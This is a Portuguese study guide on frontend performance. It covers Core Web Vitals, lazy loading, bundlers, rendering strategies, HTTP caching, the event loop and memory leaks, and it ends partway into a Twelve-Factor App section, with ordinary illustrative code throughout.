📊 Core Web Vitals Frontend Performance

As métricas que o Google usa para medir a experiência do usuário — e que impactam diretamente seu ranqueamento no search.

🔍 O que são Core Web Vitals?

Imagine que o Google é um inspetor de restaurante. Ele não avalia só a comida — avalia quanto tempo você espera ser atendido, se a cadeira balança enquanto você senta, e se o garçom some depois de pedir. Os Core Web Vitals são os critérios de avaliação desse inspetor para sites.

Analogia: Seu site é um restaurante. LCP = tempo até chegar o prato principal. CLS = a mesa que move enquanto você come. INP = o garçom que responde quando você pede algo. FCP = o pão que traz antes do prato. TTFB = tempo até o garçom aparecer pela primeira vez.

📦 LCP — Largest Contentful Paint

O que é: tempo até o maior elemento visível da página ser renderizado. Normalmente é o hero image, o H1 principal ou um bloco de texto grande.

Causas de LCP lento:

  • TTFB alto — servidor lento, sem CDN, ou sem cache.
  • Imagem hero não priorizada — o browser descobre a imagem tarde (via CSS background-image, ou img sem preload).
  • Render-blocking resources — CSS ou JS que bloqueiam o parsing HTML.
  • Imagem muito pesada — sem compressão, formato antigo (JPG em vez de WebP/AVIF).
  • Fonte web bloqueando texto — FOIT (Flash of Invisible Text).

Como corrigir:


<img src="hero.webp" fetchpriority="high" loading="eager" alt="Hero">


<link rel="preload" as="image" href="hero.webp" fetchpriority="high">


/* RUIM para LCP: */
.hero { background-image: url('hero.webp'); }

/* BOM para LCP: use <img> com fetchpriority */
💡 Dica de entrevista: O LCP element pode mudar conforme o viewport. Em mobile pode ser diferente do desktop. Use o CrUX (Chrome User Experience Report) para ver o LCP real dos seus usuários.

📐 CLS — Cumulative Layout Shift

O que é: mede o quanto os elementos "pulam" enquanto a página carrega. Sabe quando você vai clicar num botão e ele escorrega porque um anúncio carregou em cima? Isso é CLS alto.

Fórmula: CLS = impact fraction × distance fraction

Causas comuns:

  • Imagens sem width e height definidos no HTML
  • Anúncios, embeds, iframes sem dimensão reservada
  • Conteúdo injetado dinamicamente acima do conteúdo existente
  • Fontes web causando FOUT (Flash of Unstyled Text) que muda tamanho
  • Animações que usam propriedades que causam layout (top/left em vez de transform)

Como corrigir:

/* SEMPRE defina width e height em imagens */
<img src="foto.webp" width="800" height="600" alt="">

/* Reserve espaço para anúncios */
.ad-slot {
  min-height: 250px; /* altura mínima conhecida */
  aspect-ratio: 16/9; /* ou use aspect-ratio */
}

/* Use aspect-ratio para vídeos responsivos */
.video-wrapper {
  aspect-ratio: 16/9;
}

/* Para fontes: font-display: optional ou swap + size-adjust */
@font-face {
  font-family: 'MinhaFonte';
  font-display: optional; /* não mostra a fonte se demorar */
}

⚡ INP — Interaction to Next Paint

O que é: substituiu o FID em março de 2024. Mede a latência de TODAS as interações do usuário na página (cliques, toques, teclado), não só a primeira. Pega o percentil 98 dessas interações.

Analogia: FID era medir só o primeiro sinal que o garçom te dá. INP mede a média do tempo de resposta do garçom durante TODA a refeição — muito mais justo e realista.

Causas de INP ruim:

  • Long Tasks — JavaScript que roda por mais de 50ms sem pausar, bloqueando a main thread
  • Event handlers pesados — processar muita coisa no clique sem yield para o browser
  • Rendering work excessivo — muitos elementos pra re-renderizar após interação
  • Third-party scripts — analytics, chat widgets, ads que travam a thread

Como corrigir:

// RUIM — bloqueia a thread por muito tempo
button.addEventListener('click', () => {
  const result = processarDadosPesados(10000); // Long Task!
  render(result);
});

// BOM — quebra o trabalho em chunks com scheduler
button.addEventListener('click', async () => {
  // Atualiza UI imediatamente (feedback visual)
  setLoading(true);

  // yield para o browser pintar
  await scheduler.yield(); // ou setTimeout(0)

  const result = await processarEmChunks(dados);
  render(result);
});

// Usar scheduler.postTask() para prioridade
scheduler.postTask(() => tarefaPesada(), { priority: 'background' });
💡 Como medir INP: Chrome DevTools → Performance → gravar interações. Procure por Long Tasks (blocos vermelhos). Também use PerformanceObserver com event type para medir no campo.

🚀 TTFB — Time to First Byte

O que é: tempo desde que o browser fez o request até o primeiro byte de resposta chegar. É a base — se o TTFB for ruim, tudo mais fica ruim. É o gargalo mais fundamental.

TTFB inclui: DNS lookup + TCP handshake + TLS handshake + tempo do servidor processar + tempo de rede até o 1º byte.

Como melhorar:

  • CDN — aproximar o servidor do usuário (reduz tempo de rede)
  • Cache no servidor/CDN — não processar a mesma coisa duas vezes
  • Edge computing — rodar lógica na edge (Cloudflare Workers, Lambda@Edge)
  • Otimizar banco de dados — queries lentas = TTFB alto
  • HTTP/2 e HTTP/3 — reduzem overhead de conexão
⚠️ Armadilha: Um TTFB bom (50ms) pode virar ruim (800ms) se você não tiver CDN e seu servidor estiver em São Paulo mas o usuário estiver na Europa. A distância física importa.

😴 Lazy Loading Frontend Performance

Carregar recursos só quando necessário — o princípio de não pagar por algo que o usuário talvez nunca use.

🖼️ Lazy Loading de Imagens

Analogia: É como um livro de fotos. Você não precisa imprimir todas as fotos antes de abrir o livro. Você imprime só a página que está lendo. Lazy loading é isso: carregar só o que o usuário está vendo agora.

Nativo (HTML):

<!-- O browser carrega só quando a imagem está perto do viewport -->
<img src="foto.webp" loading="lazy" alt="Descrição">

<!-- NUNCA use lazy na imagem LCP! -->
<img src="hero.webp" loading="eager" fetchpriority="high" alt="Hero">

Intersection Observer (controle total):

const observer = new IntersectionObserver((entries) => {
  entries.forEach(entry => {
    if (entry.isIntersecting) {
      const img = entry.target;
      img.src = img.dataset.src; // troca data-src por src
      observer.unobserve(img);   // para de observar depois de carregar
    }
  });
}, {
  rootMargin: '200px', // começa a carregar 200px antes de entrar na tela
  threshold: 0.01
});

document.querySelectorAll('img[data-src]').forEach(img => observer.observe(img));
⚠️ Trade-off de UX: Lazy loading pode causar Layout Shift se a imagem não tiver dimensões definidas. E pode deixar o usuário esperando se rolar rápido. Use rootMargin para pré-carregar antes de entrar no viewport.

⚛️ Lazy Loading de Componentes (React)

import { lazy, Suspense } from 'react';

// Importação dinâmica — cria um chunk separado no bundle
const GraficoComplexo = lazy(() => import('./GraficoComplexo'));

function Dashboard() {
  return (
    <Suspense fallback={<div>Carregando gráfico...</div>}>
      <GraficoComplexo />
    </Suspense>
  );
}
💡 Quando usar: componentes pesados que ficam abaixo do fold, modais, sidebars, rotas secundárias. Quando NÃO usar: componentes críticos do caminho inicial (header, conteúdo acima do fold).

🛣️ Lazy Loading de Rotas

// React Router v6 com lazy loading
import { lazy, Suspense } from 'react';
import { Routes, Route } from 'react-router-dom';

const Home     = lazy(() => import('./pages/Home'));
const Sobre    = lazy(() => import('./pages/Sobre'));
const Contato  = lazy(() => import('./pages/Contato'));

function App() {
  return (
    <Suspense fallback={<LoadingSpinner />}>
      <Routes>
        <Route path="/"        element={<Home />} />
        <Route path="/sobre"   element={<Sobre />} />
        <Route path="/contato" element={<Contato />} />
      </Routes>
    </Suspense>
  );
}

// Next.js — ainda mais simples
import dynamic from 'next/dynamic';

const Mapa = dynamic(() => import('../components/Mapa'), {
  loading: () => <p>Carregando mapa...</p>,
  ssr: false // não renderiza no servidor (ex: componentes com window)

📦 Bundlers Frontend Performance

Webpack, Vite, Rollup, esbuild — o que cada um faz, quando usar, e como configurar para o máximo de performance.

🏗️ O que faz um bundler?

Analogia: Imagine que você tem 500 ingredientes espalhados em 500 armários diferentes. O bundler é o chef que pega todos esses ingredientes, remove o que não vai usar, organiza tudo em poucos potes eficientes, e deixa pronto pra servir. Sem bundler, o browser precisaria fazer 500 requests para buscar cada arquivo.
Seu Código (500 arquivos .js, .ts, .css, .png) │ ▼ ┌─────────────────────────────────┐ │ BUNDLER │ │ 1. Resolve dependências │ │ 2. Tree shaking (remove morto) │ │ 3. Transpila (TS → JS, JSX) │ │ 4. Minifica (remove espaços) │ │ 5. Divide em chunks │ │ 6. Gera hashes para cache │ └─────────────────────────────────┘ │ ▼ dist/ ├── main.a3f2c1.js (código da app) ├── vendor.d91e2b.js (React, libs) ├── chunk-sobre.f2a1.js (rota lazy) └── styles.4c9d.css

⚡ esbuild — O Mais Rápido

Escrito em Go. É de 10x a 100x mais rápido que bundlers em JS. Mas é simples — não tem alguns recursos avançados do Webpack.

Quando usar:

  • Como transpiler/minifier dentro de outros tools (Vite usa esbuild para minificação)
  • Build de libraries simples
  • Ambientes que precisam de velocidade extrema no CI
// esbuild config básico
import * as esbuild from 'esbuild';

await esbuild.build({
  entryPoints: ['src/index.ts'],
  bundle: true,
  minify: true,
  splitting: true,  // code splitting
  format: 'esm',
  outdir: 'dist',
  target: ['chrome90', 'firefox90'],
});
⚠️ Limitação: esbuild não faz type checking (apenas stripa tipos TypeScript). Use tsc --noEmit separado para checar tipos.

⚡ Vite — O Mais Moderno para Dev

Usa ESModules nativos do browser em desenvolvimento — não faz bundle algum! Cada arquivo é servido separadamente. Em produção, usa Rollup para fazer bundle otimizado.

DEV (Vite): Browser pede /src/App.tsx │ ▼ Vite transforma só esse arquivo (esbuild para transpile) │ ▼ Browser recebe o módulo em ~50ms (HMR ultra rápido — só troca o módulo alterado) PROD (Vite + Rollup): Rollup gera bundle otimizado com tree shaking agressivo
// vite.config.ts
import { defineConfig } from 'vite';
import react from '@vitejs/plugin-react';

export default defineConfig({
  plugins: [react()],
  build: {
    rollupOptions: {
      output: {
        // Separar vendor (React) em chunk próprio
        manualChunks: {
          react: ['react', 'react-dom'],
          utils: ['lodash', 'date-fns'],
        }
      }
    },
    // Gerar sourcemaps em prod (para monitoramento)
    sourcemap: true,
    // Threshold de warning para chunks grandes
    chunkSizeWarningLimit: 500, // kb
  }
});
💡 Por que Vite é tão rápido no dev? O Webpack precisa processar TODO o bundle antes de você ver qualquer coisa. O Vite serve arquivos on-demand — só processa o que o browser pede naquele momento.

🔧 Webpack — O Mais Completo

O mais antigo e completo. Ecossistema enorme de plugins. Ainda dominante em projetos grandes (CRA, Next.js até v13).

// webpack.config.js — configuração avançada
module.exports = {
  mode: 'production',
  entry: './src/index.tsx',

  optimization: {
    splitChunks: {
      chunks: 'all',
      cacheGroups: {
        // Chunk separado para vendors (React, etc.)
        vendor: {
          test: /node_modules/,
          name: 'vendors',
          chunks: 'all',
        },
        // Chunk por rota quando importado dinamicamente
      }
    },
    // Gerar IDs de módulo por conteúdo (para long-term caching)
    moduleIds: 'deterministic',
    runtimeChunk: 'single', // runtime do webpack em chunk próprio
  },

  // Tree shaking — requer modules ES6
  // sideEffects: false no package.json para libs

  module: {
    rules: [
      {
        test: /\.[tj]sx?$/,
        use: 'babel-loader', // ou swc-loader (mais rápido)
        exclude: /node_modules/,
      }
    ]
  }
};

🌳 Tree Shaking — Remover Código Morto

Analogia: Tree shaking é sacudir uma árvore para derrubar as folhas mortas. O bundler analisa o que você importou vs o que você realmente usa, e remove o resto. 
// ❌ RUIM — importar o lodash inteiro (70kb)
import _ from 'lodash';
const x = _.cloneDeep(obj);

// ✅ BOM — importar só o que usa (2kb)
import cloneDeep from 'lodash/cloneDeep';
// ou com lodash-es (suporta tree shaking via ESM)
import { cloneDeep } from 'lodash-es';

// Para sua lib funcionar com tree shaking:
// package.json
{
  "sideEffects": false, // avisa o bundler que não há side effects
  // ou liste arquivos com side effects:
  "sideEffects": ["*.css", "./src/polyfills.js"]
}
⚠️ Tree shaking requer ESModules (import/export). CommonJS (require/module.exports) não é staticamente analisável — o bundler não consegue saber o que você vai usar em runtime.

🎨 Rendering Strategies Frontend Performance

CSR, SSR, SSG, ISR, Streaming — cada um resolve um problema diferente. A escolha errada destrói performance ou aumenta custo desnecessariamente.

📺 CSR — Client-Side Rendering

O servidor envia um HTML quase vazio. O browser baixa o JS, executa, faz requests para APIs, e monta a página no cliente.

Server: "Aqui está um HTML vazio com <div id='root'></div>" Browser: baixa JS (200kb+) Browser: executa JS, faz API call Browser: recebe dados, renderiza a UI Usuário: finalmente vê o conteúdo ← muito tempo depois
Valor
TTFB✅ Muito rápido (HTML vazio)
FCP / LCP❌ Lento (espera JS + API)
SEO❌ Ruim (bots veem HTML vazio)
Custo servidor✅ Barato (só arquivos estáticos)
Complexidade✅ Simples
Ideal paraDashboards internos, apps atrás de login, ferramentas SaaS

🖥️ SSR — Server-Side Rendering

Para cada request, o servidor renderiza o HTML completo com os dados e manda pro browser. O browser exibe imediatamente, depois "hidrata" (adiciona interatividade com JS).

Browser: "Quero a página /produto/123" Server: busca dados no banco → renderiza HTML → envia Browser: exibe conteúdo imediatamente (bom TTFB → FCP) Browser: baixa JS → hidrata (adiciona eventos) → interativo
Valor
FCP / LCP✅ Rápido (HTML pronto)
SEO✅ Excelente
TTFB⚠️ Médio (servidor processa antes)
Custo servidor❌ Alto (CPU por request)
Hydration mismatch❌ Risco de bug
Ideal paraE-commerce, news, páginas com dados personalizados e SEO crítico

📄 SSG — Static Site Generation

Em build time (não em request time), o servidor gera todos os HTMLs estáticos. Servido via CDN. Ultra-rápido. Mas não tem dados dinâmicos em tempo real.

BUILD TIME: "Gere todas as páginas possíveis" → /produtos/1.html, /produtos/2.html, ...1000 páginas → Sobe tudo para CDN REQUEST TIME: Browser pede /produtos/1 CDN responde com arquivo HTML estático em <50ms
Valor
Performance✅ Máxima (CDN + HTML estático)
SEO✅ Excelente
Dados frescos❌ Requer rebuild para atualizar
Escala✅ Infinita (CDN)
Ideal paraBlogs, docs, landing pages, marketing

♻️ ISR — Incremental Static Regeneration

Híbrido: gera estático, mas revalida em background após N segundos. O primeiro usuário após expirar recebe o HTML antigo (stale), enquanto o servidor regenera em background.

// Next.js ISR
export async function getStaticProps() {
  const produtos = await buscarProdutos();
  return {
    props: { produtos },
    revalidate: 60, // regenerar a cada 60 segundos em background
  };
}

// Next.js App Router (ISR com fetch)
async function Page() {
  const data = await fetch('/api/produtos', {
    next: { revalidate: 60 } // cache por 60s, regenera em background
  });
}
💡 Padrão stale-while-revalidate: O usuário recebe o conteúdo antigo imediatamente (rápido!) enquanto o novo é gerado em background. Próximo usuário já recebe o novo.

🌊 Streaming SSR

Em vez de esperar TODO o HTML ser gerado antes de enviar, o servidor envia o HTML em pedaços (chunks) conforme vai gerando. O browser começa a renderizar antes do HTML estar completo.

SEM Streaming: Servidor gera 100% do HTML → envia tudo de uma vez → browser renderiza COM Streaming: Servidor envia: <html><head>...</head><body><header>...</header> Browser renderiza header imediatamente ↑ Servidor busca dados... ainda gerando... Servidor envia: <main><ProductList ...></ProductList></main> Browser renderiza o resto ↑
// React 18 + Next.js App Router — Streaming automático com Suspense
async function PaginaProduto({ params }) {
  return (
    <div>
      <Header />  {/* renderiza e envia imediatamente */}

      <Suspense fallback={<Skeleton />}>
        <ListaProdutos />  {/* aguarda dados, envia depois */}
      </Suspense>

      <Suspense fallback={<Skeleton />}>
        <Recomendacoes />  {/* aguarda dados, envia depois */}
      </Suspense>
    </div>
  );
}

🗄️ Cache HTTP Frontend Performance

Fazer o browser (e CDNs) guardarem recursos para não baixar de novo. A otimização mais impactante e mais mal configurada.

📚 Cache-Control: o Header Mais Importante

Analogia: Cache-Control é uma etiqueta em cada arquivo que você manda pro browser. Você escreve: "Pode guardar esse arquivo por 1 ano" ou "Não guarda isso, sempre busca de mim". O browser obedece. 
// Arquivos com hash no nome (imutáveis) — cache longo
// Ex: main.a3f2c1.js, logo.d91e2b.webp
Cache-Control: public, max-age=31536000, immutable
// public = CDN pode guardar
// max-age=31536000 = 1 ano em segundos
// immutable = browser não precisa nem verificar se mudou

// HTML principal (nunca cachear ou curto prazo)
Cache-Control: no-cache
// "Não sirva do cache sem verificar comigo primeiro"
// (diferente de no-store!)

// APIs com dados que mudam às vezes
Cache-Control: private, max-age=300, stale-while-revalidate=600
// private = só browser pode guardar (não CDN)
// max-age=300 = fresco por 5 min
// stale-while-revalidate=600 = pode servir stale por mais 10min
//   enquanto busca novo em background

🏷️ ETag — Validação de Cache

ETag é uma "impressão digital" do conteúdo. Quando o cache expira, o browser pergunta: "Ainda é esse conteúdo?" — se sim, recebe 304 Not Modified (sem baixar de novo).

1ª Request: Browser → GET /api/dados Server → 200 OK + dados + ETag: "abc123" Browser guarda: dados + etag "abc123" Cache expirou. 2ª Request: Browser → GET /api/dados + If-None-Match: "abc123" Server verifica: conteúdo mudou? ├─ NÃO → 304 Not Modified (sem body, ultra leve!) └─ SIM → 200 OK + novos dados + ETag: "xyz789"

⚡ stale-while-revalidate — O Padrão Perfeito

Serve o conteúdo em cache imediatamente (mesmo que "velho"), e busca o novo em background. Usuário tem resposta instantânea E dados relativamente frescos.

Cache-Control: max-age=60, stale-while-revalidate=3600
// max-age=60:             por 60s, serve do cache sem perguntar
// stale-while-revalidate: de 60s a 3660s, serve velho mas busca novo
//                         depois de 3660s, espera a resposta nova

💥 Cache Busting — Forçar Novo Download

Quando você precisa que o browser baixe o novo arquivo (novo deploy), mas o cache ainda está válido. A solução: mudar o nome do arquivo.

// Bundlers geram hash baseado no conteúdo do arquivo:
main.js       → main.a3f2c1.js  (hash do conteúdo)
// Se o conteúdo mudar, o hash muda:
main.js       → main.d91e2b.js  (novo hash = novo arquivo = não tem no cache)

// No HTML, o link muda → browser não tem no cache → baixa o novo
<script src="/main.a3f2c1.js"></script>  (antes do deploy)
<script src="/main.d91e2b.js"></script>  (depois do deploy)

// Por isso o index.html precisa de Cache-Control: no-cache

💡 Resource Hints Frontend Performance

Dicas que você dá ao browser para ele se antecipar — pré-conectar, pré-baixar, antes de precisar.

📋 Os 4 Resource Hints

Analogia: É como planejar uma viagem. dns-prefetch = pesquisar o endereço do hotel antes. preconnect = já pegar o carro e ir até o hotel antes de precisar (endereço + entrada). preload = levar a mala no carro antes de precisar dela. prefetch = já empacotar a mala do próximo destino enquanto ainda está no atual.
HintO que fazQuando usarCusto
dns-prefetchResolve DNS antecipadoDomínios terceiros (CDN, analytics)Baixo
preconnectDNS + TCP + TLS antecipadoOrigens críticas (fontes, APIs)Médio
preloadBaixa recurso ASAP (alta prioridade)Recursos críticos da página atualAlto (usa banda)

<head>
  <!-- DNS lookup antecipado para domínio de analytics -->
  <link rel="dns-prefetch" href="//analytics.example.com">

  <!-- Conexão completa com Google Fonts (crítico para render) -->
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>

  <!-- Preload: carregar LCP image com prioridade máxima -->
  <link rel="preload" as="image" href="/hero.webp" fetchpriority="high">

  <!-- Preload: fonte crítica -->
  <link rel="preload" as="font" href="/fonts/inter.woff2"
        type="font/woff2" crossorigin>

  <!-- Prefetch: próxima rota que o usuário provavelmente vai acessar -->
  <link rel="prefetch" href="/checkout.js">
</head>

⚠️ Custo do Uso Errado

  • Preload sem usar: browser baixa o recurso, desperdiça banda, e ainda mostra aviso no console: "resource was preloaded but not used"
  • Preconnect para muitos domínios: cada conexão usa sockets e memória. Limite a 2-3 origens mais críticas.
  • Prefetch em conexão lenta: vai roubar banda do conteúdo que o usuário está usando agora.
  • Preload sem as: browser não sabe o tipo, baixa com prioridade errada ou baixa duas vezes.
🚨 Erro clássico: Fazer preload de scripts com as="script" mas sem type="module" quando usa ESModules — o browser baixa duas vezes.

⚙️ JS Runtime Frontend Performance

Como o JavaScript funciona por baixo dos panos — Event Loop, Call Stack, Task Queue, Microtasks. Entender isso é a diferença entre código que trava e código que flui.

🔄 Event Loop — A Ideia Fundamental

Analogia: JavaScript é um restaurante com UM único garçom (single-threaded). Esse garçom atende UMA mesa por vez. Quando você pede a conta (setTimeout), ele anota no caderno e vai atender outras mesas. Quando termina o que estava fazendo, olha o caderno e vai buscar a conta. O Event Loop é esse ciclo de: atende o que tem na mão → olha o caderno → atende o próximo.
┌─────────────────────────────────────────────────┐ │ HEAP (memória) │ │ Objetos, variáveis, closures │ └─────────────────────────────────────────────────┘ ┌─────────────┐ ┌──────────────────────────────┐ │ CALL STACK │ │ WEB APIs (browser) │ │ │ │ setTimeout, fetch, DOM events│ │ main() │ │ Executam em background │ │ onClick() │ │ Quando terminam, colocam │ │ ───────── │ │ callbacks nas filas abaixo │ └─────────────┘ └──────────────────────────────┘ │ ▼ EVENT LOOP (fica olhando: "Call Stack vazia? Pega próximo da fila") ┌────────────────────────┐ ┌───────────────────────┐ │ MICROTASK QUEUE │ │ TASK QUEUE │ │ (PRIORIDADE ALTA) │ │ (PRIORIDADE BAIXA) │ │ │ │ │ │ Promise.then() │ │ setTimeout() │ │ queueMicrotask() │ │ setInterval() │ │ MutationObserver │ │ I/O callbacks │ │ │ │ click/keydown events │ │ Esvazia TUDO antes │ │ Um por vez, depois │ │ de ir para Task Queue │ │ volta pras microtasks │ └────────────────────────┘ └───────────────────────┘
console.log('1'); // Call Stack — executa agora

setTimeout(() => console.log('2'), 0); // Task Queue — depois

Promise.resolve().then(() => console.log('3')); // Microtask Queue

console.log('4'); // Call Stack — executa agora

// Output: 1 → 4 → 3 → 2
// Por quê?
// 1 e 4: executam direto na Call Stack
// 3: Microtask — esvazia ANTES da Task Queue
// 2: Task Queue — só depois que microtasks acabaram

🚫 Main Thread Blocking — O Inimigo Público Nº1

Se seu JS rodar por mais de ~50ms sem pausar, o browser fica travado — não consegue responder a cliques, não atualiza a UI. Isso é uma Long Task.

// ❌ RUIM — bloqueia main thread por ~500ms
function processarLista(lista) {
  return lista.map(item => calcularPesado(item)); // long task!
}

// ✅ BOM — divide em chunks com yield
async function processarListaAsync(lista) {
  const resultados = [];
  for (let i = 0; i < lista.length; i++) {
    resultados.push(calcularPesado(lista[i]));

    // A cada 50 itens, deixa o browser respirar
    if (i % 50 === 0) {
      await new Promise(resolve => setTimeout(resolve, 0));
      // ou: await scheduler.yield();
    }
  }
  return resultados;
}

// ✅ MELHOR — Web Worker (outra thread)
const worker = new Worker('processador.js');
worker.postMessage(lista);
worker.onmessage = (e) => exibir(e.data);

🎞️ requestAnimationFrame

Para animações, sempre use requestAnimationFrame (rAF). Ele sincroniza com o refresh do monitor (~60fps = 16.6ms por frame). setTimeout(fn, 16) pode chamar no momento errado do ciclo de render.

// ❌ RUIM para animações
function animar() {
  elemento.style.left = `${x++}px`;
  setTimeout(animar, 16); // pode desenhar fora de sync
}

// ✅ BOM
function animar() {
  elemento.style.left = `${x++}px`;
  requestAnimationFrame(animar); // sincronizado com o browser
}
requestAnimationFrame(animar);

// Cancelar animação
const id = requestAnimationFrame(animar);
cancelAnimationFrame(id);

🎨 CSS Performance Frontend Performance

CSS parece simples, mas cada propriedade que você muda pode disparar processos caros no browser. Entender o pixel pipeline é essencial.

🔄 O Pixel Pipeline: Reflow → Repaint → Composite

JavaScript → Style → Layout → Paint → Composite (Reflow) (Repaint) LAYOUT (Reflow) — mais caro: Recalcula posição e tamanho de elementos. Disparado por: width, height, top, left, margin, padding, font-size, display, border, ... Um reflow em um elemento pai pode reflowing TODOS os filhos! PAINT (Repaint) — médio: Preenche pixels dos elementos (cor, sombra, texto...). Disparado por: color, background, box-shadow, outline, visibility, border-radius... (Não recalcula layout, só repinta) COMPOSITE — mais barato: Combina camadas na GPU. Não toca CPU! Disparado por: transform, opacity, filter → É o que você quer usar para animações!
/* ❌ RUIM — causa Reflow (layout) na animação */
.elemento {
  animation: mover 1s linear;
}
@keyframes mover {
  to { left: 200px; } /* Reflow a cada frame! */
}

/* ✅ BOM — só Composite (GPU) */
.elemento {
  animation: mover 1s linear;
}
@keyframes mover {
  to { transform: translateX(200px); } /* Apenas Composite */
}

/* Propriedades que só disparam Composite: */
/* transform (translate, rotate, scale) */
/* opacity */
/* filter (parcialmente) */

🌐 Network e CDN Frontend Performance

HTTP/2, HTTP/3, compressão e CDNs — como a rede impacta performance e como tirar o máximo dela.

📡 HTTP/1.1 vs HTTP/2 vs HTTP/3

HTTP/1.1: Conexão 1: GET arquivo1.js ──────── response Conexão 2: GET arquivo2.js ──────── response Conexão 3: GET arquivo3.js ──────── response (Max ~6 conexões paralelas por domínio, overhead de TCP por cada) HTTP/2: 1 conexão TCP, múltiplos streams: Stream 1: GET arquivo1.js ─┐ Stream 2: GET arquivo2.js ─┤── 1 conexão ── responses multiplexadas Stream 3: GET arquivo3.js ─┘ + Header compression (HPACK) + Server Push (server manda recursos antes de pedir) HTTP/3 (QUIC): Usa UDP em vez de TCP! + Sem head-of-line blocking do TCP + 0-RTT resumption (reconecta sem handshake) + Melhor em redes instáveis (mobile)
💡 Impacto prático: Com HTTP/2, o "domain sharding" (colocar recursos em múltiplos domínios) é contraproducente — você perde o multiplexing e gera mais handshakes TCP. Com HTTP/1.1, domain sharding era uma otimização comum.

🌍 CDN — Content Delivery Network

Analogia: Imagine que você tem uma pizzaria em São Paulo mas quer servir pessoas em Tóquio. Sem CDN: o pedido vai para SP, a pizza voa 18.500km, chega fria. Com CDN: você tem um parceiro em Tóquio com a receita. O pedido vai para Tóquio (50km), a pizza chega quentinha.
  • Edge Caching: CDN guarda cópias dos seus recursos em pontos de presença (PoPs) ao redor do mundo
  • Resource Prioritization: HTTP/2 priority, Early Hints (103) para avisar o browser do que vem antes
  • Cache Hit Ratio: percentual de requests que o CDN responde sem ir à origem — meta: >95%
  • Invalidação: quando você muda um arquivo, precisa invalidar o cache da CDN (por path ou por tag)

🕳️ Memory Leaks Frontend Performance

Quando JavaScript guarda referências a coisas que não são mais necessárias, impedindo o garbage collector de limpar a memória. A app fica mais lenta com o tempo até travar.

🔍 Causas Comuns

1. Event Listeners não removidos:

// ❌ LEAK — listener adicionado mas nunca removido
function Componente() {
  useEffect(() => {
    window.addEventListener('resize', handleResize);
    // Sem cleanup! Ao desmontar, listener persiste
  }, []);
}

// ✅ BOM — cleanup na saída
function Componente() {
  useEffect(() => {
    window.addEventListener('resize', handleResize);
    return () => window.removeEventListener('resize', handleResize); // cleanup!
  }, []);
}

2. Closures capturando mais do que deveriam:

// ❌ LEAK — closure guarda referência ao array enorme
function criarHandler(dadosGigantes) {
  return function handler() {
    console.log(dadosGigantes.length); // dadosGigantes fica em memória
  };                                    // enquanto handler existir
}

// ✅ BOM — captura só o necessário
function criarHandler(dadosGigantes) {
  const tamanho = dadosGigantes.length; // captura só o que precisa
  return function handler() {
    console.log(tamanho);
  };
}

3. Timers não limpos:

// ❌ LEAK
useEffect(() => {
  setInterval(() => fetchDados(), 1000);
  // componente desmonta mas interval continua!
}, []);

// ✅ BOM
useEffect(() => {
  const id = setInterval(() => fetchDados(), 1000);
  return () => clearInterval(id);
}, []);

4. Cache/Maps sem limite:

// ❌ LEAK — Map cresce indefinidamente
const cache = new Map();
function processar(req) {
  cache.set(req.id, req.data); // nunca limpa!
}

// ✅ BOM — WeakMap (chaves são coletadas quando objeto é GC)
const cache = new WeakMap();
// Quando o objeto-chave é descartado, a entrada some automaticamente

🏭 Twelve-Factor App
Os 12 Fatores

🏭 The Twelve-Factor App Arquitetura

Metodologia criada pela Heroku para construir aplicações SaaS escaláveis, portáveis e resilientes. Saber nomear os 12 fatores é o mínimo — a entrevista quer que você justifique cada um com cenários reais e saiba onde o modelo falha.

🗺️ Visão Geral dos 12 Fatores

Analogia: Imagine que você está construindo um restaurante que vai abrir franquias em todo o mundo. Os 12 fatores são as regras que garantem que qualquer franquia funcione igual, sem depender do chef específico, da cozinha local, ou do fornecedor da cidade. É um contrato de qualidade para software.
I. Codebase → Uma árvore, muitas frutas (deploys) II. Dependencies → Declare tudo, não assuma nada III. Config → Ambiente, não código IV. Backing Services → Trate como recursos plugáveis V. Build/Release/Run → Três estágios separados e imutáveis VI. Processes → Stateless, share-nothing VII. Port Binding → Auto-suficiente, sem Apache externo VIII.Concurrency → Escale via processos, não threads IX. Disposability → Rápido pra subir, gracioso pra morrer X. Dev/Prod Parity → Gap mínimo entre ambientes XI. Logs → Stream de eventos, não arquivos XII. Admin Processes → One-off tasks como cidadãs de primeira classe

I. Codebase — Uma Codebase, Múltiplos Deploys

O que é: Uma aplicação = um repositório Git. Múltiplos deploys (dev, staging, prod) derivam do mesmo repo, em commits diferentes.

┌── deploy: production (commit a3f2) git repo (único) ──┼── deploy: staging (commit d91e) └── deploy: dev (commit HEAD)
⚠️ Violação clássica: Copiar código entre repositórios diferentes para "customizar para cada ambiente". Se dois apps compartilham código, esse código deve virar uma lib separada (npm package, módulo interno).

Onde o modelo falha:

Em monorepos com múltiplos apps, a definição fica nebulosa — cada app deve ter seu próprio pipeline de deploy, mesmo que estejam no mesmo repo.

II. Dependencies — Declare Explicitamente, Nunca Assuma

O que é: Todas as dependências devem estar declaradas num manifesto (package.json, requirements.txt, go.mod) e isoladas — nunca confiar em libs "já instaladas" no sistema.

// ✅ package.json declara TUDO
{
  "dependencies": { "express": "4.18.2" },
  "devDependencies": { "jest": "29.0.0" }
}

// ❌ VIOLAÇÃO — assumir que curl está no sistema
exec('curl https://api.example.com/data'); // e se não tiver?

// ✅ Use a lib Node.js (declarada) em vez de tool do sistema
import fetch from 'node-fetch'; // declarado no package.json

Onde o modelo falha:

Dependências de sistema que não são empacotadas (libssl, ffmpeg binário, drivers de GPU) — o twelve-factor não resolve isso. Aí entra Docker: containerizar o ambiente inteiro.

III. Config — Variáveis de Ambiente, Nunca no Código

O que é "config de verdade"? Tudo que muda entre deploys: URLs de bancos, API keys, feature flags por ambiente, credenciais. Não é configuração interna da app (número de threads do pool, timeout padrão).

// ❌ VIOLAÇÃO — config hardcoded no código
const DB_URL = 'postgres://user:pass@prod-db.example.com/app';

// ❌ VIOLAÇÃO — config em arquivo de configuração commitado
// config/production.json com credenciais reais

// ✅ Correto — variável de ambiente
const DB_URL = process.env.DATABASE_URL;
if (!DB_URL) throw new Error('DATABASE_URL é obrigatória');

// Teste fácil: você consegue abrir o código no GitHub
// sem expor NENHUMA credencial? Se sim, passou no fator III.
💡 Dica de entrevista: A diferença entre config e código: config pode mudar sem alterar uma linha de código ou fazer novo deploy. Se precisar de novo deploy para mudar, é código.

IV. Backing Services — Recursos Plugáveis via URL

O que são backing services: banco de dados, cache (Redis), filas (SQS), email (SendGrid), APIs de terceiros. A app não deve distinguir entre um serviço local e um remoto — tudo é acessado via URL/config.

